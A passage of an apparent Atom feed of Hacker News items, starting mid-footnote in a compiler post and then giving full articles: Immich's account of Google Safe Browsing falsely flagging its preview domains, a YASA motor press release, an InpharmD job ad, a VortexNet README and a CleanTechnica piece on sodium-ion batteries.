is&lt;code&gt;null&lt;/code&gt;, it is never loaded from. ↩&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Returned stack pointers do not escape: stack slots’ lifetimes end at function exit, so we return a dangling pointer, which we assume are never loaded. So stores to that pointer before returning it can be discarded. ↩&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://mcyoung.xyz/2025/10/21/ssa-1/"/><published>2025-10-22T20:13:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45675015</id><title>Google flags Immich sites as dangerous</title><updated>2025-10-23T04:12:21.466769+00:00</updated><content>&lt;doc fingerprint="8912a2d078360380"&gt;
  &lt;main&gt;
    &lt;p&gt;October 20, 2025&lt;/p&gt;
    &lt;p&gt;— Jason Rasmussen&lt;/p&gt;
    &lt;p&gt;Earlier this month all of our &lt;code&gt;*.immich.cloud&lt;/code&gt; websites were marked as dangerous and users started being shown the dreaded "red-screen-of-death" page.&lt;/p&gt;
    &lt;p&gt;No one on the team really understood how this browser feature worked, but it's now, unfortunately, been added to our list of Cursed Knowledge .&lt;/p&gt;
    &lt;p&gt;Google offers a service called Safe Browsing , which aims to determine if a site is running malware, unwanted software, or performs some form of social engineering. The service is free, and many browsers, including Chrome &amp;amp; Firefox, directly integrate the service into their products, although it is still a bit unclear how it actually determines if something is "dangerous".&lt;/p&gt;
    &lt;p&gt;So, what happens if your site is marked as dangerous? Well, since most browsers seem to use this service, your site essentially becomes unavailable for all users, except the few that might realize it's a false positive, click the &lt;code&gt;Details&lt;/code&gt; button, and then see and click the tiny, underlined "visit this safe site" link. So basically it becomes unavailable for your entire audience with little apparent recourse.&lt;/p&gt;
    &lt;p&gt;At some point earlier this month, we realized that a bunch of sites on the &lt;code&gt;immich.cloud&lt;/code&gt; domain had recently started showing up as "dangerous". At the same time, a few users started complaining about their own Immich deployments being flagged. We also noticed that all our own internal sites had the same warning, including our preview environments. It got old real fast to have to go through the tedious effort to "view this safe site" whenever we wanted to view anything.&lt;/p&gt;
    &lt;p&gt;After a few days we realized this warning was not going to go away on its own, and that the Google Search Console was apparently the official way to manage these types of issues. It seems a bit crazy that the only way to make our site available again was to create a Google account, and use the Google Search Console to request a review of the affected site. The service did at least provide a few more details about what exactly was flagged, although it made the whole thing a bit more comical. Per the service:&lt;/p&gt;
    &lt;p&gt;Google has detected harmful content on some of your site’s pages. We recommend that you remove it as soon as possible. Until then, browsers such as Google Chrome will display a warning when users visit or download certain files from your site.&lt;/p&gt;
    &lt;p&gt;and&lt;/p&gt;
    &lt;p&gt;These pages attempt to trick users into doing something dangerous, such as installing unwanted software or revealing personal information.&lt;/p&gt;
    &lt;p&gt;Below these warnings was a list of affected URLs:&lt;/p&gt;
    &lt;code&gt;https://main.preview.internal.immich.cloud/
https://main.preview.internal.immich.cloud/auth/login
https://pr-22838.preview.internal.immich.cloud/
https://pr-22838.preview.internal.immich.cloud/auth/login
...&lt;/code&gt;
    &lt;p&gt;It was super useful to learn that the affected URLs were for our preview environments. Maybe the thought was that these Immich environments were imitating our demo website ? The most alarming thing was realizing that a single flagged subdomain would apparently invalidate the entire domain.&lt;/p&gt;
    &lt;p&gt;This issue affects all of our preview environments and other internal services such as zitadel, outline, grafana, victoria metrics, etc. This also impacts our production tile server, which is deployed at &lt;code&gt;tiles.immich.cloud&lt;/code&gt; . Luckily, the requests to the tile server are made via JavaScript, and since those are not user facing they seem to still be working as expected.&lt;/p&gt;
    &lt;p&gt;The Google Search Console has a &lt;code&gt;Request Review&lt;/code&gt; button, where you can explain how you have resolved the issues. It does warn that:&lt;/p&gt;
    &lt;p&gt;Requesting a review of issues that weren't fixed will result in longer review cycles&lt;/p&gt;
    &lt;p&gt;Since, nothing is actually wrong we decided to respond with the following:&lt;/p&gt;
    &lt;p&gt;Immich is a self-hosted application, and the Immich team (https://immich.app/ ) owns and operates the &lt;code&gt;immich.cloud&lt;/code&gt; domain and subdomains. The flagged sites are our own deployments of our own products and are not impersonating anything or anyone else.&lt;/p&gt;
    &lt;p&gt;A day or two later, the resolution was accepted and the domain was clean again! 🎉&lt;/p&gt;
    &lt;p&gt;We thought we were home free, but unfortunately that was not the case.&lt;/p&gt;
    &lt;p&gt;An Immich preview environment can be requested by adding the &lt;code&gt;preview&lt;/code&gt; label to a pull request on GitHub. When the environment is created, a comment is posted on the pull request with the preview url, which follows the following format:&lt;/p&gt;
    &lt;code&gt;https://pr-&amp;lt;num&amp;gt;.preview.internal.immich.cloud/&lt;/code&gt;
    &lt;p&gt;As soon as we created a new preview environment, the &lt;code&gt;immich.cloud&lt;/code&gt; domain was once again flagged as a dangerous site. The best we can tell, Google crawls GitHub, sees the new URL, crawls the site, marks it as deceptive, and the whole process begins anew.&lt;/p&gt;
    &lt;p&gt;Our current plan is to attempt to minimize the impact of this issue by moving the preview environments to their own, dedicated domain — &lt;code&gt;immich.build&lt;/code&gt; .&lt;/p&gt;
    &lt;p&gt;Google Safe Browsing looks to be have been built without consideration for open-source or self-hosted software. Many popular projects have run into similar issues, such as:&lt;/p&gt;
    &lt;p&gt;Unfortunately, Google seems to have the ability to arbitrarily flag any domain and make it immediately unaccessible to users. I'm not sure what, if anything, can be done when this happens, except constantly request another review from the all mighty Google.&lt;/p&gt;
    &lt;p&gt;Cheers,&lt;lb/&gt;The Immich Team&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://immich.app/blog/google-flags-immich-as-dangerous"/><published>2025-10-22T20:53:49+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45675020</id><title>YASA beats own power density record pushing electric motor to 59kW/kg benchmark</title><updated>2025-10-23T04:12:20.472737+00:00</updated><content>&lt;doc fingerprint="15f8c0544943841b"&gt;
  &lt;main&gt;
    &lt;p&gt;(Yarnton, Oxfordshire, UK) October 22, 2025 – YASA, the global leader in the design and production of axial flux motors, has smashed its own unofficial power density world record with a staggering new benchmark for ultra-high-performance electric motors.&lt;/p&gt;
    &lt;p&gt;Earlier in the summer, YASA achieved 550kW (738bhp) from a 13.1kg version of its new axial flux prototype motor, equating to an unofficial power density world record of 42kW/kg, but latest testing of an even lighter 12.7kg version has significantly exceeded this.&lt;/p&gt;
    &lt;p&gt;Hitting a staggering 750kW (&amp;gt;1000bhp) short-term peak rating, YASA has set a new unofficial electric motor power density world record of 59kW/kg – a 40% increase on initial testing. But the motor is not just focused on setting new standards for peak power, YASA also estimates that its all-important continuous power will be in the region of 350kW-400kW (469bhp-536bhp).&lt;/p&gt;
    &lt;p&gt;Designed and developed at YASA’s high-tech Oxford Innovation Centre, the breakthrough represents another major validation of the company’s axial flux technology. And crucially, this isn’t a theoretical model or digital concept: it is a fully functional prototype, undergoing a rigorous development program. Compact, scalable and with no exotic materials used, it achieves exceptional performance through precision engineering, advanced thermal management and optimised packaging. This extraordinary motor design has been developed and realised with support from the Advanced Propulsion Centre, UK.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“On behalf of the entire YASA team, I’m proud and excited to so quickly follow up on the already remarkable results of our initial testing with this incredible result,” said Tim Woolmer, Founder and CTO, YASA. “To achieve a 750kW short-term peak rating and a density of 59kW/kg is a major validation of our next-generation axial flux technology. It’s proof of what focused engineering innovation can achieve. And this isn’t a concept on a screen — it’s running, right now, on the dynos. We’ve built an electric motor that’s significantly more power-dense than anything before it – all with scalable materials and processes. This motor will bring game-changing technology to the high-performance automotive sector.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;YASA’s engineering team is already validating the prototype through extended testing cycles.&lt;/p&gt;
    &lt;p&gt;Simon Odling, YASA’s Chief of New Technology, commented: “The early results are extremely encouraging. The motor’s performance on the dyno has exceeded even our most optimistic simulations. As well as its incredible peak power and overall power density, we estimate this new motor will be able to deliver all-important continuous power in the region of 350kW-400kW. This is real hardware, in real life, delivering real data – and it’s performing beautifully.”&lt;/p&gt;
    &lt;p&gt;“This record demonstrates what makes YASA unique,” added Joerg Miska, CEO, YASA. “With three times the performance density of today’s leading radial flux motors, YASA continues to redefine the boundaries of what’s possible in electric motor design – turning pure innovation into tangible engineering progress. Our technology is delivering measurable results today, while paving the way for a new generation of lightweight, efficient electric propulsion systems.”&lt;/p&gt;
    &lt;p&gt;Further details on the development of the prototype motor will be shared in upcoming releases.&lt;/p&gt;
    &lt;p&gt;For media inquiries, please contact:&lt;lb/&gt; e: media@yasa.com&lt;/p&gt;
    &lt;p&gt;YASA, a wholly owned subsidiary of Mercedes-Benz Group since 2021, is redefining the future of Electric Vehicle performance. YASA design and manufacture high performance electric motors and power electronics for the premium automotive industry, employing over 400 people across sites in Oxford, Bicester and Welshpool. YASA’s revolutionary axial-flux electric powertrain technology brings the highest power/torque densities in class for the smallest size and weight.&lt;/p&gt;
    &lt;p&gt;Find out more at yasa.com&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://yasa.com/news/yasa-smashes-own-unofficial-power-density-world-record-pushing-state-of-the-art-electric-motor-to-staggering-new-59kw-kg-benchmark/"/><published>2025-10-22T20:54:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45675090</id><title>InpharmD (YC W21) Is Hiring – NLP Engineer</title><updated>2025-10-23T04:12:19.982758+00:00</updated><content>&lt;doc fingerprint="a92f231c7de6e6de"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt; | InpharmD Jobs&lt;/p&gt;
      &lt;/div&gt;
      &lt;head rend="h3"&gt;Hiring - NLP/ML Engineer&lt;/head&gt;
      &lt;p&gt;InpharmDTM helps healthcare providers make better clinical decisions by giving them the data behind their questions. &lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item style="font-weight: 400;"&gt;Founded: 2018&lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Funding stage: Seed ($6.05M)&lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Revenue stage: Series A (~$5M annual run rate)&lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Net gain/loss per month: profitable&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Over that time, our revenue has grown 750% into the very healthy 7-figures.&lt;/p&gt;
      &lt;p&gt;What makes us different is that we’ve grown fast while being capital efficient (not raising much money). We’ve done this with a performance-driven culture that attracts, retains, and rewards phenomenal people. We also:&lt;/p&gt;
      &lt;list rend="ol"&gt;
        &lt;item style="font-weight: 400;"&gt;Leverage scale- We focus on processes and systems necessary for us to grow intentionally today and into the future. &lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Share an ownership (driver vs passenger) mindset- We iterate at a remarkable pace amidst uncertainty, putting in long hours along the way- but and because we love it. &lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Avoid drama and wasted time- None of us want a political company culture and we meet once a week (formally).&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Market conditions are perfect for us to continue to grow at this pace with a small and mighty team. This is our competitive advantage over bloated incumbents, and by the time they realize it, it’ll be too late. &lt;/p&gt;
      &lt;head rend="h3"&gt;Desired Qualifications&lt;/head&gt;
      &lt;p&gt;We’re looking for an AI Engineer who’s passionate about building real-world healthcare products that make a difference. What matters most to us is skill, creativity, and drive — not degrees or titles.&lt;/p&gt;
      &lt;list data-start="368" data-end="809" rend="ul"&gt;
        &lt;item data-start="368" data-end="443"&gt;
          &lt;p&gt;You take pride in doing great work and hold yourself to high standards.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="444" data-end="518"&gt;
          &lt;p&gt;You think clearly about systems but also care about the small details.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="519" data-end="590"&gt;
          &lt;p&gt;You’ve helped build or scale AI or healthcare tech products before.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="591" data-end="661"&gt;
          &lt;p&gt;You use data and metrics to guide product or feature improvements.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="662" data-end="738"&gt;
          &lt;p&gt;You consistently deliver exceptional results, not just average outcomes.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="739" data-end="809"&gt;
          &lt;p&gt;You stay humble, collaborative, and eager to learn — no egos here.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="739" data-end="809"&gt;Minimum 5 + years of experience in developing AI applications.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Tech Skills&lt;/head&gt;
      &lt;list data-start="133" data-end="755" rend="ul"&gt;
        &lt;item data-start="133" data-end="185"&gt;
          &lt;p&gt;Strong background in AI and Machine Learning&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="186" data-end="311"&gt;
          &lt;p&gt;Hands-on experience with Large Language Models (LLMs) and open-source models (e.g., Llama, Mistral, Falcon, etc.)&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="312" data-end="371"&gt;
          &lt;p&gt;Proficiency in Python, Rust, and/or Next.js&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="372" data-end="456"&gt;
          &lt;p&gt;Experience working with Vector Databases (like Pinecone, ChromaDB, or FAISS)&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="457" data-end="544"&gt;
          &lt;p&gt;Familiarity with background job systems such as Celery, SQS, or similar&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="545" data-end="602"&gt;
          &lt;p&gt;Experience managing and processing large datasets&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="603" data-end="679"&gt;
          &lt;p&gt;Solid understanding of AWS services (S3, EC2, Lambda, Bedrock, etc.)&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="680" data-end="755"&gt;
          &lt;p&gt;Contribution or participation in open-source LLM projects is a plus&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Logistics&lt;/head&gt;
      &lt;list data-start="148" data-end="371" rend="ul"&gt;
        &lt;item data-start="148" data-end="172"&gt;
          &lt;p&gt;Hours: Full-time&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="173" data-end="209"&gt;
          &lt;p&gt;Contact: Tulasee Rao Chintha&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="210" data-end="270"&gt;
          &lt;p&gt;Location: Atlanta Tech Village (preferred) or Remote&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="271" data-end="371"&gt;
          &lt;p&gt;Compensation: $150K base salary, commensurate with experience, plus InpharmD stock options&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Milestones&lt;/head&gt;
      &lt;list data-start="200" data-end="769" rend="ul"&gt;
        &lt;item data-start="200" data-end="290"&gt;
          &lt;p&gt;Improve AI Accuracy: Enhance our core AI algorithm’s accuracy from 95% to 99%.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="291" data-end="486"&gt;
          &lt;p&gt;Build Orchestration Engine: Develop an intelligent orchestration layer so our researchers and human-in-the-loop systems can operate in autopilot mode for answering clinical questions.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="487" data-end="630"&gt;
          &lt;p&gt;Automate Content Generation: Reduce drug monograph and class review generation time from days to hours — and eventually to minutes.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="631" data-end="769"&gt;
          &lt;p&gt;Predictive AI: Integrate predictive analytics into our drug analysis tools to forecast outcomes and insights more effectively.&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Equal Opportunity Employer&lt;/p&gt;
      &lt;p&gt;At InpharmD, we believe the best teams are diverse. We value unique perspectives and encourage everyone to apply — even if you don’t meet every single qualification.&lt;/p&gt;
      &lt;p&gt;All qualified applicants will be considered without regard to race, color, religion, gender, gender identity or expression, sexual orientation, national origin, genetics, disability, age, or veteran status.&lt;/p&gt;
      &lt;head rend="h3"&gt;Interested?&lt;/head&gt;
      &lt;p&gt;Learn more about us on our InpharmD blog.&lt;/p&gt;
      &lt;p&gt;If you’re excited about building the future of AI in healthcare, send an email to admins@inpharmd.com — your message goes directly to the founders. Feel free to include why you’re interested and what kind of opportunity you’re looking for.&lt;/p&gt;
      &lt;p&gt;Share&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://inpharmd.com/jobs/inpharmd-is-hiring-ai-ml-engineer"/><published>2025-10-22T21:01:07+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45676162</id><title>VortexNet: Neural network based on fluid dynamics</title><updated>2025-10-23T04:12:19.375749+00:00</updated><content>&lt;doc fingerprint="18ff0e742050fb6a"&gt;
  &lt;main&gt;
    &lt;p&gt;This repository contains toy implementations of the concepts introduced in the research paper VortexNet: Neural Computing through Fluid Dynamics. These examples demonstrate how PDE-based vortex layers and fluid-inspired mechanisms can be integrated into neural architectures, such as autoencoders for different datasets.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Note: These are toy prototypes for educational purposes and are not intended as fully optimized or physically precise fluid solvers.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;vortexnet_mnist.py&lt;/code&gt;:&lt;lb/&gt;A demonstration script for building and training a VortexNet Autoencoder on the MNIST dataset.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;vortexnext_image.py&lt;/code&gt;:&lt;lb/&gt;An advanced script for building and training a VortexNet Autoencoder on custom image datasets with enhanced features like data augmentation and latent space interpolation.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;git clone https://github.com/samim23/vortexnet.git
cd vortexnet&lt;/code&gt;
    &lt;p&gt;Ensure you have Python 3.8+ installed. Install the required Python packages using &lt;code&gt;pip&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;pip install torch torchvision matplotlib pyyaml scikit-learn seaborn tensorboard&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;MNIST Dataset:&lt;/p&gt;&lt;lb/&gt;The MNIST dataset will be automatically downloaded by&lt;code&gt;vortexnet_mnist.py&lt;/code&gt;if not already present.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Custom Image Dataset:&lt;/p&gt;&lt;lb/&gt;For&lt;code&gt;vortexnext_image.py&lt;/code&gt;, place your images (JPEG, PNG, or JPEG formats) inside the&lt;code&gt;my_data/&lt;/code&gt;directory.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This script builds and trains a VortexNet Autoencoder on the MNIST dataset.&lt;/p&gt;
    &lt;p&gt;Usage:&lt;/p&gt;
    &lt;code&gt;python3.11 vortexnet_mnist.py&lt;/code&gt;
    &lt;p&gt;This advanced script builds and trains a VortexNet Autoencoder on custom image datasets with enhanced features.&lt;/p&gt;
    &lt;p&gt;Usage:&lt;/p&gt;
    &lt;code&gt;python3.11 vortexnext_image.py --config config_image.yaml&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;Configuration Files:&lt;/p&gt;&lt;lb/&gt;Ensure the configuration file (&lt;code&gt;config_image.yaml&lt;/code&gt;) is properly set up before running the scripts.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Output Directory:&lt;/p&gt;&lt;lb/&gt;All outputs, including logs, reconstructed images, and model checkpoints, are saved in the&lt;code&gt;output_dir&lt;/code&gt;specified in the respective configuration files.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;TensorBoard:&lt;/p&gt;&lt;lb/&gt;For monitoring training progress, you can launch TensorBoard pointing to the&lt;code&gt;output_dir&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/samim23/vortexnet"/><published>2025-10-22T22:51:58+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45677243</id><title>The Sodium-Ion Battery Revolution Has Started</title><updated>2025-10-23T04:12:19.126962+00:00</updated><content>&lt;doc fingerprint="3818886de2c717a1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Sodium-Ion Battery Revolution Has Started&lt;/head&gt;
    &lt;p&gt;Support CleanTechnica's work through a Substack subscription or on Stripe.&lt;/p&gt;
    &lt;p&gt;Sodium-ion batteries have been in the works for years, and now sodium-ion batteries have started to appear in cars and home storage. JAC, in a partnership with Volkswagen, has been shipping a vehicle called the Sehol or E10X with sodium-ion batteries since 2023. Recently, Bluetti introduced the Pioneer Na(sodium) portable power station. This is just the beginning.&lt;/p&gt;
    &lt;p&gt;HiNa supplied sodium-ion batteries for JAC Motors in 2023. Early batteries had lower gravimetric energy density (145 Wh/kg) and volumetric energy density (330 Wh/liter) than LFP, but sodium-ion batteries have already improved since then. They have outstanding temperature range, yielding 88% retention at -20°C. For reference, the discharge capacity of NMC at 0°C, −10°C and −20°C is only 80%, 53%, and 23% of that at 25°C. The HiNa batteries had a cycle life of 4,500 cycles with 83% retention and a 2C charge rate, but even better sodium-ion batteries are on their way.&lt;/p&gt;
    &lt;p&gt;HiNa opened a 1 GWh sodium-ion battery factory in December 2022. Since then, both BYD and CATL have opened huge sodium-ion battery factories. The investment is there and indicates a permanent presence for sodium.&lt;/p&gt;
    &lt;p&gt;Since then, CATL has thrown its hat into the ring with the Naxtra sodium-ion battery, with 175 Wh/kg and 10,000 lifetime cycles along with operation from -40°C to 70°C. CATL is planning a start-stop battery for trucks using the technology. It has the potential to replace lead-acid batteries. CATL has announced battery pricing at the cell level in volume at $19/kWh.&lt;/p&gt;
    &lt;p&gt;BYD, a major competitor to CATL, has not stood still either. BYD opened a sodium-ion battery factory in 2024, and is producing a large sodium-ion battery energy storage system (BESS) called MC Cube-T with a capacity of 6.4 MWh. BYD’s sodium battery factory has a massive planned capacity of 30 GWh annually. These companies mean business. Sodium ion is here to stay.&lt;/p&gt;
    &lt;p&gt;These developments point the way to much more. The cost of sodium battery materials is much lower than for any lithium battery. There are no resource bottleneck materials like cobalt or lithium to contend with. In addition, aluminum can be used for electrodes, whereas lithium requires copper for one of the electrodes. Carbon or graphite and separator materials will be similar, but in all other respects, sodium has much lower material costs. Compared to LFP, sodium does not require phosphorous, a substance that is almost exclusively sourced from one state in north Africa, nor lithium, a relatively abundant but more expensive substance than sodium. LFP cannot compete on material costs or temperature range, and both BYD and CATL expect to phase it out first in energy storage.&lt;/p&gt;
    &lt;head rend="h3"&gt;Implications are Clear for the Future&lt;/head&gt;
    &lt;p&gt;Availability of such a low-cost, wide-temperature-range battery makes a wide range of applications possible that were not available before. While batteries have enabled passenger car developments, they have been somewhat stymied in large mobile power applications like shipping and electric trucks. That day is gone now. At these costs, electric shipping is achievable and the debate over alternative fuels will fall off quickly as applications are realized. Batteries with similar characteristics, like LFP, already offer reasonable range and cargo-carrying capacity for long-distance shipping. These developments push that over the top and set electric shipping at parity with legacy fossil fuel shipping and beyond when maintenance and all cost factors are considered.&lt;/p&gt;
    &lt;p&gt;In cars, sodium puts passenger vehicles well beyond parity into the “why are we doing this anymore?” category in comparison with ICE (internal combustion engines). Combustion makes no sense whatsoever when the alternative lasts for hundreds of thousands of miles and works with ambient temperatures from -40°C to 70°C. There are literally no more excuses any more. Not range, not charging speed, not cost. The first sodium-ion battery cars were already shipping in China years ago and have been shipped to South America. In both places, they seriously undercut the first cost of any equivalent internal combustion vehicle. Now, in a short time, they have improved to compete and beat lithium-ion batteries.&lt;/p&gt;
    &lt;p&gt;As of now, LFP does the bulk of truck applications in China, where over 90% of the world’s heavy electric trucks exist. Sodium-ion batteries are expected to displace LFP in energy storage and heavy truck applications. The implications are far wider than that, however. For other applications sensitive to energy storage cost, the cost drops dramatically. In particular, swap stations and fast charging stations with battery buffering drop, changing the picture dramatically. Implementation of those should increase with lower capital costs. Electric shipping will go from slow lane to fast lane as the advantages of sodium are realized. Already, CATL has announced a partnership with Maersk, hinting at future developments in that area.&lt;/p&gt;
    &lt;p&gt;It is likely other applications, like replacements for lead-acid batteries with sodium, will appear, but many others are likely. Renewables will benefit greatly, with costs for storage so low that the complaints of variability and cost vanish. While existing lithium batteries have changed the world in so many ways, the presence of sodium-ion batteries can be expected to transform our world faster. The sheer quantity of batteries and electrification made possible by the presence of lower-cost, higher-capability batteries makes the changes in electrification to date pale by comparison. About the only field left to conquer in battery storage is high-density, high-power applications like aircraft, but more breakthroughs are on their way in the form of lithium-sulfur and solid-state batteries.&lt;/p&gt;
    &lt;p&gt;Sign up for CleanTechnica's Weekly Substack for Zach and Scott's in-depth analyses and high level summaries, sign up for our daily newsletter, and follow us on Google News!&lt;/p&gt;
    &lt;p&gt;Have a tip for CleanTechnica? Want to advertise? Want to suggest a guest for our CleanTech Talk podcast? Contact us here.&lt;/p&gt;
    &lt;p&gt;Sign up for our daily newsletter for 15 new cleantech stories a day. Or sign up for our weekly one on top stories of the week if daily is too frequent.&lt;/p&gt;
    &lt;p&gt;CleanTechnica uses affiliate links. See our policy here.&lt;/p&gt;
    &lt;p&gt;CleanTechnica's Comment Policy&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://cleantechnica.com/2025/10/22/the-sodium-ion-battery-revolution-has-started/"/><published>2025-10-23T01:36:37+00:00</published></entry></feed>